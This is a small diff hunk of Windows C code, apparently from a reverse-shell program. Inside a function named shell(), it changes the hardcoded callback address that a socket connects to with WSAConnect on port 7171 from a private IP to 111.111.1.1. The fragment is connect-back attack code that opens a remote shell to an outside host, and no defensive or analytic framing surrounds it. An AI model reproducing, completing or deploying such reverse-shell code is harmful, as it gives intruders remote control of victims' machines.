@@ -23,7 +23,7 @@ void shell()
 
 	hax.sin_family = AF_INET;
 	hax.sin_port = htons(7171);
-	hax.sin_addr.s_addr = inet_addr("192.168.2.130");
+	hax.sin_addr.s_addr = inet_addr("111.111.1.1");
 
 	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
 
